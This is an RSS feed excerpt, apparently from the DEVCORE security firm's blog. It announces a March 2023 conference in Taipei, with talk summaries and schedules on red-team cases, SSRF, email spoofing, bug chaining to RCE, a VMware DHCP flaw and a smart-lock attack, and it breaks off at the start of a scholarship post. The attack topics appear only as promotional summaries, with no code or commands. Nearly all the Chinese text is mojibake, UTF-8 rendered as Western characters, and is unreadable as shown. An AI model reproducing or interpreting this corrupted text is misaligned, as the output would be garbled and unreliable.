&lt;p&gt;ç´…éšŠç¸½ç›£æš¨å…±åŒå‰µè¾¦äººè¨±å¾©å‡±ï¼ˆShaolinï¼‰å‰‡å¼·èª¿ï¼Œç›®å‰å°ç£åƒ…æœ‰ DEVCORE é¡˜æ„å…¬é–‹åˆ†äº«ç´…éšŠé€²éšæ”»æ“ŠæŠ€æ³•ï¼Œæ©Ÿæœƒç›¸ç•¶é›£å¾—ï¼Œè€Œæ­¤å ´ç ”è¨æœƒä¸åƒ…é©åˆå¸Œæœ›æ›´åŠ æ·±å…¥äº†è§£æ”»æ“ŠæŠ€è¡“çš„è½çœ¾ï¼Œä¹Ÿå¾ˆé©åˆä¼æ¥­è—éšŠè—‰æ­¤äº†è§£ç´…éšŠå¦‚ä½•çœ‹å¾…é˜²ç¦¦ï¼Œå¾ä¸­ç²å¾—å•Ÿç™¼ï¼Œä»¥äº†è§£å¯ä»¥å¼·åŒ–çš„é˜²ç¦¦é¢å‘ï¼Œç¾å ´ä¹Ÿå°‡èˆ‡è½çœ¾äº¤æµæŠ€è¡“åŠé§­å®¢æ€ç¶­ã€‚&lt;/p&gt;

&lt;p&gt;é‡å°é§­å®¢å ´ï¼Œè¨±å¾©å‡±åˆ†æï¼Œä¸ŠåŠå ´å°‡æ–¼è½çœ¾åˆ†äº«ç´…éšŠåœ¨çœŸå¯¦æ¼”ç·´æ™‚å¦‚ä½•é‹ç”¨ä¼æ¥­èˆ‡è—éšŠé›£ä»¥æƒ³åƒçš„æ”»æ“Šæ‰‹æ³•ï¼Œä¸‹åŠå ´å‰‡è‘—é‡åˆ†äº« DEVCORE åœ˜éšŠå°çœŸå¯¦ä¸–ç•Œç”¢å“çš„ç ”ç©¶æ‰‹æ³•ï¼Œç”šè‡³ä¹Ÿæœ‰å…¨çƒç™½å¸½é§­å®¢æœ€é«˜æ®¿å ‚ Pwn2Own ç­‰åƒè³½èƒŒå¾Œç§˜è¾›èˆ‡è¶£äº‹ï¼Œå ´å ´ç²¾è¯ï¼Œä¸å®¹éŒ¯éã€‚&lt;/p&gt;

&lt;p&gt;é§­å®¢å ´å°‡åˆ†äº«æœ€æ–°æ¼æ´ç ”ç©¶åŠçœŸå¯¦ç´…éšŠæ¼”ç·´æ¡ˆä¾‹ï¼ŒåŒ…å«ï¼šå¾é›¶é–‹å§‹çš„ Pwn2Own é§­å®¢å¤§è³½å¥ªå† ä¹‹è·¯ã€å¦‚ä½•ä»¥ MITRE ATT&amp;amp;CK æ¡†æ¶æª¢è¦–ç´…éšŠæ¼”ç·´ã€SSRF æ”»æ“Šæ‰‹æ³•èˆ‡å¯¦æˆ°ç²¾è¯ã€Email ç¾ä»£æ”»æ“Šæ‰‹æ³•ã€å¦‚ä½•å°‡å»¢æ´ä¸²æ¥æˆ RCE æ¼æ´ã€è™›æ“¬æ©Ÿä¹‹å®‰å…¨æŒ‘æˆ°ã€ç‰©è¯ç¶²è£ç½®æ”»æ“Šå¯¦ä¾‹ã€‚ä¼æ¥­å ´å‰‡å°‡ä»¥æ·±å…¥æ·ºå‡ºçš„æ–¹å¼åˆ†äº«å°ç£è³‡å®‰åå¹´æ›´æ–°è¿­ä»£ã€DEVCORE åå¹´è³‡å®‰å¥‡å¹»æ—…ç¨‹ã€ç´…éšŠæ¼”ç·´ç­–ç•¥ä½¿ç”¨æ–¹å¼èˆ‡çœŸæ­£åƒ¹å€¼ã€ä¼æ¥­å¸¸è¦‹è³‡å®‰é¢¨éšªã€æœ€è®“é§­å®¢é ­ç—›çš„è³‡å®‰é˜²ç¦¦æ©Ÿåˆ¶ç­‰ã€‚&lt;/p&gt;

&lt;h2 id=&quot;æ´»å‹•è³‡è¨Š&quot;&gt;æ´»å‹•è³‡è¨Š&lt;/h2&gt;

&lt;h3 id=&quot;æ™‚é–“&quot;&gt;æ™‚é–“ï¼š&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;ä¼æ¥­å ´ï¼š2023/03/10ï¼ˆäº”ï¼‰13:00 - 16:30ï¼ˆå ±åå¯©æ ¸åˆ¶ï¼‰&lt;/li&gt;
  &lt;li&gt;é§­å®¢å ´ï¼š2023/03/11ï¼ˆå…­ï¼‰08:40 - 16:20ï¼ˆæ”¶è²»åˆ¶ï¼‰&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;åœ°é»&quot;&gt;åœ°é»ï¼š&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;TICC å°åŒ—åœ‹éš›æœƒè­°ä¸­å¿ƒ 201 æœƒè­°å®¤ï¼ˆå°åŒ—å¸‚ä¿¡ç¾©å€ä¿¡ç¾©è·¯äº”æ®µ1è™Ÿï¼‰&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;è²»ç”¨&quot;&gt;è²»ç”¨ï¼š&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;2023/03/10ï¼ˆäº”ï¼‰ä¼æ¥­å ´ï¼šå…è²»&lt;/li&gt;
  &lt;li&gt;2023/03/11ï¼ˆå…­ï¼‰é§­å®¢å ´ï¼ˆåé€±å¹´ç‰¹æƒ åƒ¹ï¼‰ï¼šæ—©é³¥ç¥¨ 3,000 å…ƒï¼ˆé™é¡ 150 åï¼‰ï¼›æ™šé³¥ç¥¨ 5,000 å…ƒï¼›å­¸ç”Ÿç¥¨ 1,500 å…ƒ&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;è­°ç¨‹ä»‹ç´¹&quot;&gt;è­°ç¨‹ä»‹ç´¹&lt;/h2&gt;

&lt;h3 id=&quot;20230310äº”ä¼æ¥­å ´&quot;&gt;2023/03/10ï¼ˆäº”ï¼‰ä¼æ¥­å ´ï¼š&lt;/h3&gt;

&lt;p&gt;æœ¬å ´æ¬¡å°ˆç‚ºä¼æ¥­æ±ºç­–è€…åŠè³‡å®‰ç®¡ç†è€…é‡èº«æ‰“é€ ï¼Œå°‡å¾ DEVCORE ç‚ºä½•æ–¼ 2017 å¹´ç™¼ç¾å®¢æˆ¶éœ€æ±‚ã€é¦–å…ˆæ¨å‡ºç´…éšŠæ¼”ç·´é–‹å§‹ï¼Œç´°æ•¸ 5 å¹´ä¾†æˆ‘å€‘åœ¨è¿‘ 70 å ´ç´…éšŠæ¼”ç·´ä¸­çš„çè²´ç™¼ç¾ï¼ŒåŒ…å«ä¾›æ‡‰éˆä¸­æ˜“è¢«å¿½ç•¥çš„è³‡å®‰é¢¨éšªã€è³‡å®‰ç­–ç•¥èˆ‡æ©Ÿåˆ¶å„ªå…ˆé †åºå¦‚ä½•æ–Ÿé…Œã€è³‡å®‰ç”¢å“æœ‰æ•ˆæ€§é©—è­‰ç­‰ã€‚&lt;/p&gt;

&lt;p&gt;æ­¤å¤–ï¼Œæˆ‘å€‘ä¹Ÿå°‡é€éæ­¤å ´ç ”è¨æœƒï¼Œå”åŠ©ä¼æ¥­ç†è§£å¦‚ä½•æ‰“é€ æœ€é©åˆçš„è³‡å®‰æˆ°ç•¥ï¼Œä¸¦èƒ½æœ‰æ•ˆã€æ­£ç¢ºä½¿ç”¨ç´…éšŠæ¼”ç·´æ­¤é …ç­–ç•¥å·¥å…·ï¼Œé”åˆ°è­˜åˆ¥é¢¨éšªã€ä¸¦ç™¼æ®ç´…éšŠæ¼”ç·´æœ€å¤§æ•ˆç›Šã€‚&lt;/p&gt;

&lt;p&gt;åœ¨ä¼æ¥­å ´ä¸­ï¼Œæˆ‘å€‘ä¹Ÿç‰¹åˆ¥ç´å…¥ä¼æ¥­æœ€å¸¸è¦‹çš„è³‡å®‰å•é¡Œã€å¦‚ä½•è‡ªæˆ‘è©•ä¼°å®‰å…¨ã€å¦‚ä½•ä¿è­·ç¶²åŸŸæœå‹™ï¼ˆADï¼‰ç­‰ï¼Œå»ºç«‹è³‡å®‰è‡ªä¿è§€å¿µå¾Œï¼Œå†é€²ä¸€æ­¥æ¢è¨å“ªäº›é˜²ç¦¦æ©Ÿåˆ¶èˆ‡ç”¢æ¥­å°¤é›£æ”»é™·ã€æ”»æ“Šè€…å¦‚ä½•æƒ…è’èˆ‡æŒ‘é¸ç›®æ¨™ç­‰ã€‚&lt;/p&gt;

&lt;p&gt;é¢å°æ°¸ä¸åœæ­‡çš„ç¶²è·¯æˆ°ï¼Œå»ºæ§‹æ­£ç¢ºçš„è³‡å®‰ç­–ç•¥ï¼Œå°‡æ˜¯è¿æˆ°çš„ç¬¬ä¸€æ­¥ï¼Œè€Œå”¯æœ‰äº†è§£çœŸå¯¦çš„é§­å®¢æ€ç¶­èˆ‡æ”»æ“Šæ–¹å¼ï¼Œæ‰èƒ½ç¢ºä¿ä¼æ¥­ç«‹æ–¼ä¸æ•—ä¹‹åœ°ã€‚&lt;/p&gt;

&lt;h3 id=&quot;20230311å…­é§­å®¢å ´&quot;&gt;2023/03/11ï¼ˆå…­ï¼‰é§­å®¢å ´ï¼š&lt;/h3&gt;

&lt;p&gt;æœ¬å ´æ¬¡å°‡æ·±å…¥æ¢è¨æœ€æ–°æ”»æ“Šæ‰‹æ³•èˆ‡æ¼æ´ï¼Œé©åˆè³‡å®‰æŠ€è¡“äººå“¡åŠæœ‰èˆˆè¶£çš„è³‡å®‰ç®¡ç†éšå±¤åƒèˆ‡ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ä»¥ç´…éšŠæ€ç¶­çœ‹è—éšŠé˜²ç¦¦ï¼Œç´…è—æ”»é˜²ä¸­çš„ç¶“å…¸æ¡ˆä¾‹&lt;/strong&gt;
å…·å‚™è±å¯ŒæŒ‡æ®ä½œæˆ°ç¶“é©—çš„ DEVCORE ç´…éšŠæ¼”ç·´éšŠé•· Dingï¼Œå°‡æ–¼æœ¬å ´è­°ç¨‹ä¸­åˆ†äº«è¿‘ 70 å ´æ©«è·¨é‡‘èã€ç§‘æŠ€ã€é›»å•†ã€å‚³ç”¢ç­‰å„ç”¢æ¥­ç¶“å…¸æ¡ˆä¾‹ï¼Œä¸¦ä»¥ MITRE ATT&amp;amp;CK æ¡†æ¶ï¼Œé€ä¸€åˆ†æå¯¦æˆ°ç¶“é©—ä¸­ä½¿ç”¨çš„æˆ°è¡“èˆ‡æ”»æ“Šæ‰‹æ³•ï¼šåˆå§‹å…¥ä¾µé™¤äº†OWASP TOP 10 ä¸­å¸¸è¦‹æ”»æ“ŠæŠ€å·§å¤–é‚„æœ‰å“ªäº›æ–¹å¼ï¼Ÿæ”»æ“Šè€…å¦‚ä½•æŒçºŒæ½›ä¼ï¼Œä¸”åŒæ™‚é”æˆé˜²æ¯’è»Ÿé«”æœªç¤ºè­¦ã€äº¦ç„¡æª”æ¡ˆè½åœ°ï¼Ÿæ”»æ“Šè€…å¦‚ä½•åœ¨ç¶²è·¯å¯¦é«”éš”é›¢æ™‚ä»èƒ½æ©«å‘ç§»å‹•ï¼Ÿæ”»æ“Šè€…å¦‚ä½•ä»¥å‡ºäººæ„æ–™çš„æ‰‹æ®µæå‡æ¬Šé™ï¼Ÿ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;è®“æµé‡ç©¿éä½ çš„å·´å·´ - ç´…éšŠå¯¦æˆ° SSRF ç¶“å…¸æ¡ˆä¾‹&lt;/strong&gt;
å„˜ç®¡ SSRF æ˜¯ä¸€å€‹æ­·å²æ‚ ä¹…çš„çŸ¥åæ”»æ“Šæ‰‹æ³•ï¼Œæ”»æ“Šè€…å¯è—‰æ­¤ç©¿éå¤–ç¶²é˜²ç«ç‰†ã€å…¥ä¾µå…§ç¶²ï¼Œä½†ç›¸è¼ƒæ–¼æŒ‡ä»¤æ³¨å…¥æˆ–ä»»æ„æª”æ¡ˆä¸Šå‚³ç­‰é¡ RCE æ¼æ´ï¼Œå…¶åš´é‡æ€§ä¼¼ä¹ç•¥éœä¸€ç±Œã€‚ç´…éšŠæ¼”ç·´å°ˆå®¶ Vtim å°‡ä»¥éå»æ–¼ç´…éšŠæ¼”ç·´å°ˆæ¡ˆä¸­é‡åˆ°çš„ SSRF çœŸå¯¦æ¡ˆä¾‹ï¼Œæ¢è¨å…¶ç©¶ç«Ÿæ˜¯å ±å‘Šä¸Šæœ‰åç„¡å¯¦çš„é«˜é¢¨éšªæ¼æ´ï¼Œæˆ–æ˜¯ä¼æ¥­ä»ä¸èƒ½å¿½è¦–çš„é‡è¦å®‰å…¨å•é¡Œã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;I wanna know ä½ ä¿¡ä¸ä¿¡ - ç¾ä»£éƒµä»¶è©è¡“&lt;/strong&gt;
å»å¹´æ–¼åœ‹éš›æŠ€èƒ½ç«¶è³½ç¶²è·¯å®‰å…¨è·é¡å–å¾—éŠ€ç‰Œçš„å°ç£åœ‹æ‰‹ï¼ŒåŒæ™‚ä¹Ÿæ˜¯ DEVCORE ç´…éšŠæ¼”ç·´å°ˆå®¶çš„ Micoï¼Œå°‡æ–¼æ­¤å ´è­°ç¨‹ä¸­åˆ†äº«å„ç¨®ä¼æ¥­çµ„ç¹”èˆ‡å€‹äººæ”¶ä¿¡æ–¹å¼çµ„åˆå¼æ”»æ“Šæ‰‹æ³•ï¼Œä¸¦é€ä¸€å‰–ææ”»æ“Šè€…å¦‚ä½•ä½¿ç”¨ Email å½é€ æ¬ºé¨™ä»¥åŠç¹éåƒåœ¾éƒµä»¶éæ¿¾å™¨ï¼Œå”åŠ©ä¼æ¥­é˜²ç¯„ä»¥ Email åšç‚ºåˆå§‹å…¥ä¾µé»çš„æ”»æ“Šã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;é»‘é­”æ³•ã€å¤§å£è›‹å¾—å´©ï¼Œè®“å››å€‹è‡­èŸ²è®Šæˆæ¼æ´å§ï¼&lt;/strong&gt;
å†å»¢çš„ä½åˆ†æ¼æ´ä¹Ÿæœ‰æ˜¥å¤©ï¼é›è‚‹èˆ¬çš„å¼±é»ï¼Œå°ç´…éšŠè€Œè¨€é‚„æœ‰ä»»ä½•åˆ©ç”¨åƒ¹å€¼å—ï¼Ÿä½é¢¨éšªã€åˆ©ç”¨æ©Ÿæœƒä¹Ÿä½çš„å°æ¼æ´ï¼Œä¼æ¥­çœŸçš„å¯ä»¥ç½®ä¹‹ä¸ç†å—ï¼ŸDEVCORE è³‡æ·±ç´…éšŠæ¼”ç·´å°ˆå®¶ Cyku åŠ æŠ€è¡“å°ˆæ¡ˆç¶“ç† Crystal å°‡é€éå¯¦éš›æ¡ˆä¾‹ï¼Œåˆ†äº«æ”»æ“Šè€…å¦‚ä½•å°‡å››å€‹ CVSS å¹¾ä¹ 0.0 åˆ†çš„å»¢æ´åŒ–è…æœ½ç‚ºç¥å¥‡ï¼Œä¸²æˆ RCE æ¼æ´ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;æŒ‘æˆ°ç™¾è¬è³é‡‘ï¼è™›æ“¬ä¸–ç•Œä¹‹å¯†å®¤é€ƒè„«&lt;/strong&gt;
ä»¥è™›æ“¬æ©Ÿåˆ†ææƒ¡æ„ç¨‹å¼æ˜¯ç›®å‰è¢«å»£æ³›æ¡ç”¨çš„åˆ†ææ–¹å¼ä¹‹ä¸€ï¼Œç„¶è€Œå…¶èƒŒå¾Œå»å¯èƒ½å­˜åœ¨æ˜“è¢«å¿½ç•¥çš„å®‰å…¨å•é¡ŒåŠæ¼æ´ã€‚æ›¾ç²é§­å®¢å¥§æ–¯å¡ Pwnie Awards ã€Œæœ€ä½³ä¼ºæœå™¨æ¼æ´ã€ è‚¯å®šçš„è³‡æ·±è³‡å®‰ç ”ç©¶å“¡ Meh å°‡ä»¥ VMware ä¸­æ½›è—æ–¼ DHCP å”è­°çš„æ¼æ´ç‚ºä¾‹ï¼Œèˆ‡è½çœ¾åˆ†äº«è™›æ“¬æ©Ÿæ½›åœ¨çš„è³‡å®‰é¢¨éšªä»¥åŠå…¶ç ”ç©¶æˆæœã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Remote Door Execution&lt;/strong&gt;
å®¶ç”¨ç‰©è¯ç¶²è£ç½®è¢«é§­å®¢ç”¨ä»¥ç›£çœ‹æˆ–ç›£è½å·²æ˜¯å»£ç‚ºäººçŸ¥çš„è³‡å®‰å•é¡Œï¼Œç„¶è€Œè‹¥é–€é–ä¹Ÿèƒ½è¢«é ç«¯é™æ§é–‹å•Ÿï¼Œé™¤äº†å€‹äººéš±ç§é­åˆ°ä¾µçŠ¯ï¼Œæ›´æ˜¯å±…å®¶å®‰å…¨çš„é‡å¤§å¨è„…ã€‚èˆ‡ç ”ç©¶åœ˜éšŠå…±åŒå¥ªå¾— Pwn2Own Toronto 2022 å† è»çš„è³‡å®‰ç ”ç©¶å“¡ Niniï¼Œå°‡æ–¼æœ¬å ´è­°ç¨‹ä¸­åˆ†äº«å…¶å¦‚ä½•å˜—è©¦é€éè»Ÿç¡¬é«”æ”»æ“Šï¼Œæœ€çµ‚åœ¨é›»å­é–ä¸Šç™¼æ˜å¯ä»¥ä»»æ„é–‹é–€çš„æ¼æ´ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;From Zero to Hero - å¾é›¶é–‹å§‹çš„ Pwn2Own å¥ªå† ä¹‹è·¯&lt;/strong&gt;
DEVCORE è‡ª 2020 å¹´é–‹å§‹åƒèˆ‡ç™½å¸½é§­å®¢æœ€é«˜æ®¿å ‚ç«¶è³½ Pwn2Ownï¼Œè¿„ä»Šæ‹¿ä¸‹å…©æ¬¡äºè»ã€å…©æ¬¡å† è»ã€‚æ­¤å ´è­°ç¨‹å°‡ç”±é§­å®¢ç•Œé —è² ç››åã€å±¢å±¢ç²çä¸¦å—é‚€æ¼”è¬›çš„ DEVCORE é¦–å¸­è³‡å®‰ç ”ç©¶å“¡ Orange åŠè³‡æ·±è³‡å®‰ç ”ç©¶å“¡ Angelboy å…±åŒä¸»è¬›ï¼Œèˆ‡æœƒçœ¾åˆ†äº«å¦‚ä½•æŒ‘é¸ç›®æ¨™ã€å»ºç«‹åœ˜éšŠé»˜å¥‘ã€è©¦èª¤èˆ‡å­¸ç¿’ã€èˆ‡å» å•†ä¹‹é–“çš„æ”»é˜²æˆ°ç­‰åƒè³½èƒŒå¾Œç§˜è¾›èˆ‡è¶£äº‹ã€‚&lt;/p&gt;

&lt;h2 id=&quot;è­°ç¨‹è¡¨&quot;&gt;è­°ç¨‹è¡¨&lt;/h2&gt;

&lt;h3 id=&quot;20230310äº”ä¼æ¥­å ´-1&quot;&gt;2023/03/10ï¼ˆäº”ï¼‰ä¼æ¥­å ´ï¼š&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;æ™‚é–“&lt;/th&gt;
      &lt;th&gt;è­°ç¨‹&lt;/th&gt;
      &lt;th&gt;è¬›å¸«&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;13:00 - 13:30&lt;/td&gt;
      &lt;td&gt;ä¾†è³“å ±åˆ°&lt;/td&gt;
      &lt;td&gt;ï¼&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;13:30 - 13:40&lt;/td&gt;
      &lt;td&gt;é–‹å¹•&lt;/td&gt;
      &lt;td&gt;ï¼&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;13:40 - 14:10&lt;/td&gt;
      &lt;td&gt;æ”»æ“Šä¸€æ—¥ï¼Œå‰µæ¥­åå¹´&lt;/td&gt;
      &lt;td&gt;DEVCORE åŸ·è¡Œé•·æš¨å…±åŒå‰µè¾¦äºº Allen&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;14:10 - 14:40&lt;/td&gt;
      &lt;td&gt;ç´…éšŠç´…éšŠï¼Œå¤šå°‘æœå‹™å‡æ±ä¹‹åè€Œè¡Œï¼&lt;/td&gt;
      &lt;td&gt;DEVCORE å•†å‹™ç™¼å±•ç¸½ç›£ Aaron&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;14:40 - 15:20&lt;/td&gt;
      &lt;td&gt;ä¸­å ´ä¼‘æ¯&lt;/td&gt;
      &lt;td&gt;ï¼&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;15:20 - 15:50&lt;/td&gt;
      &lt;td&gt;ç´…éšŠå¸¸è¦‹ Q&amp;amp;A å¤§è§£å¯†&lt;/td&gt;
      &lt;td&gt;DEVCORE è³‡æ·±å‰¯ç¸½æš¨å…±åŒå‰µè¾¦äºº Bowen&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;15:50 - 16:20&lt;/td&gt;
      &lt;td&gt;ç´…éšŠçš„ä¸‹ä¸€æ­¥ Ver. 2023&lt;/td&gt;
      &lt;td&gt;DEVCORE ç´…éšŠç¸½ç›£æš¨å…±åŒå‰µè¾¦äºº Shaolin&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;16:20 - 16:30&lt;/td&gt;
      &lt;td&gt;é–‰å¹•&lt;/td&gt;
      &lt;td&gt;ï¼&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;20230311å…­é§­å®¢å ´-1&quot;&gt;2023/03/11ï¼ˆå…­ï¼‰é§­å®¢å ´ï¼š&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;æ™‚é–“&lt;/th&gt;
      &lt;th&gt;è­°ç¨‹&lt;/th&gt;
      &lt;th&gt;è¬›å¸«&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;08:40 - 09:30&lt;/td&gt;
      &lt;td&gt;ä¾†è³“å ±åˆ°&lt;/td&gt;
      &lt;td&gt;ï¼&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;09:30 - 09:40&lt;/td&gt;
      &lt;td&gt;é–‹å¹•&lt;/td&gt;
      &lt;td&gt;ï¼&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;09:40 - 10:10&lt;/td&gt;
      &lt;td&gt;ä»¥ç´…éšŠæ€ç¶­çœ‹è—éšŠé˜²ç¦¦ï¼Œç´…è—æ”»é˜²ä¸­çš„ç¶“å…¸æ¡ˆä¾‹&lt;/td&gt;
      &lt;td&gt;DEVCORE ç´…éšŠæ¼”ç·´éšŠé•· Ding&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10:10 - 10:40&lt;/td&gt;
      &lt;td&gt;è®“æµé‡ç©¿éä½ çš„å·´å·´ - ç´…éšŠå¯¦æˆ° SSRF ç¶“å…¸æ¡ˆä¾‹&lt;/td&gt;
      &lt;td&gt;DEVCORE ç´…éšŠæ¼”ç·´å°ˆå®¶ Vtim&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10:40 - 11:00&lt;/td&gt;
      &lt;td&gt;ä¸­å ´ä¼‘æ¯&lt;/td&gt;
      &lt;td&gt;/&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;11:00 - 11:30&lt;/td&gt;
      &lt;td&gt;I wanna know ä½ ä¿¡ä¸ä¿¡ - ç¾ä»£éƒµä»¶è©è¡“&lt;/td&gt;
      &lt;td&gt;DEVCORE ç´…éšŠæ¼”ç·´å°ˆå®¶ Mico&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;11:30 - 12:00&lt;/td&gt;
      &lt;td&gt;é»‘é­”æ³•ã€å¤§å£è›‹å¾—å´©ï¼Œè®“å››å€‹è‡­èŸ²è®Šæˆæ¼æ´å§ï¼&lt;/td&gt;
      &lt;td&gt;DEVCORE è³‡æ·±ç´…éšŠæ¼”ç·´å°ˆå®¶ Cyku&lt;br /&gt; &amp;amp; æŠ€è¡“å°ˆæ¡ˆç¶“ç† Crystal&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;12:00 - 13:30&lt;/td&gt;
      &lt;td&gt;åˆé¤ä¼‘æ¯&lt;/td&gt;
      &lt;td&gt;ï¼&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;13:30 - 14:00&lt;/td&gt;
      &lt;td&gt;æŒ‘æˆ°ç™¾è¬è³é‡‘ï¼è™›æ“¬ä¸–ç•Œä¹‹å¯†å®¤é€ƒè„«&lt;/td&gt;
      &lt;td&gt;DEVCORE è³‡æ·±è³‡å®‰ç ”ç©¶å“¡ Meh&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;14:00 - 14:30&lt;/td&gt;
      &lt;td&gt;Remote Door Execution&lt;/td&gt;
      &lt;td&gt;DEVCORE è³‡å®‰ç ”ç©¶å“¡ Nini&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;14:30 - 15:10&lt;/td&gt;
      &lt;td&gt;ä¸­å ´ä¼‘æ¯&lt;/td&gt;
      &lt;td&gt;ï¼&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;15:10 - 16:10&lt;/td&gt;
      &lt;td&gt;From Zero to Hero - å¾é›¶é–‹å§‹çš„ Pwn2Own å¥ªå† ä¹‹è·¯&lt;/td&gt;
      &lt;td&gt;DEVCORE é¦–å¸­è³‡å®‰ç ”ç©¶å“¡ Orange&lt;br /&gt; &amp;amp; è³‡æ·±è³‡å®‰ç ”ç©¶å“¡ Angelboy&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;16:10 - 16:20&lt;/td&gt;
      &lt;td&gt;é–‰å¹•&lt;/td&gt;
      &lt;td&gt;ï¼&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;è©³ç´°è³‡è¨ŠåŠå ±åæ–¹å¼è«‹è‡³ KKTIX æŸ¥è©¢ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;3/10 ä¼æ¥­å ´ï¼š&lt;a href=&quot;https://devcore.kktix.cc/events/devcoreconf2023-0310&quot;&gt;https://devcore.kktix.cc/events/devcoreconf2023-0310&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;3/11 é§­å®¢å ´ï¼š&lt;a href=&quot;https://devcore.kktix.cc/events/devcoreconf2023&quot;&gt;https://devcore.kktix.cc/events/devcoreconf2023&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2023/01/12/DEVCORE-conference-registration-open-now/</link>
                <guid>https://devco.re/blog/2023/01/12/DEVCORE-conference-registration-open-now</guid>
                <pubDate>Thu, 12 Jan 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2022 å¹´åº¦å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘é ’çé¤æ•˜é †åˆ©è½å¹•</title>
                <description>&lt;p&gt;2022 å¹´åº¦ã€Œæˆ´å¤«å¯‡çˆ¾å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘ã€é ’çé¤æ•˜å·²æ–¼ 12 æœˆ 17 æ—¥é †åˆ©è½å¹•ã€‚&lt;/p&gt;

&lt;p&gt;ä¸€è·¯èµ°ä¾†ï¼Œç„¡è«–æ˜¯åœ¨æˆ‘å€‘çš„å­¸ç¿’ä¹‹è·¯ã€å‰µæ¥­éç¨‹ä¸­ï¼Œæˆ‘å€‘éƒ½å—åˆ°äº†ä¾†è‡ªå„æ–¹çš„æ”¯æŒèˆ‡å”åŠ©ï¼Œå› æ­¤æˆ‘å€‘ä¹Ÿå¸Œæœ›å›é¥‹ç¤¾æœƒä¸¦åŸ¹è‚²è³‡å®‰äººæ‰ï¼Œä»¥çå­¸é‡‘çš„æ–¹å¼ï¼Œå”åŠ©å­¸ç”Ÿå»ºæ§‹æ­£ç¢ºè³‡å®‰æ„è­˜åŠæŠ€èƒ½å¤–ï¼Œä¹Ÿèƒ½åŠæ—©ç­è§£æ¥­ç•Œç¾æ³ï¼Œé™ä½ç”¢å­¸è½å·®ã€‚&lt;/p&gt;

&lt;p&gt;ã€Œæˆ´å¤«å¯‡çˆ¾å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘ã€æ¯å¹´è£œåŠ© 10 ååœ¨è³‡å®‰é ˜åŸŸç ”ç©¶æˆæœå‚‘å‡ºçš„å¤§å°ˆé™¢æ ¡å­¸ç”Ÿï¼Œæ¯åé ’ç™¼ 2 è¬å…ƒçé‡‘ï¼Œå¸Œæœ›ä½¿é€™äº›è³‡å®‰ç•Œçš„æ˜æ—¥ä¹‹æ˜Ÿå¾—ä»¥ç„¡å¾Œé¡§ä¹‹æ†‚ï¼Œå°ˆæ³¨ç²¾é€²è³‡å®‰æŠ€è¡“ï¼Œæœªä¾†æˆç‚ºç¨ç•¶ä¸€é¢çš„è³‡å®‰äººæ‰ã€‚&lt;/p&gt;

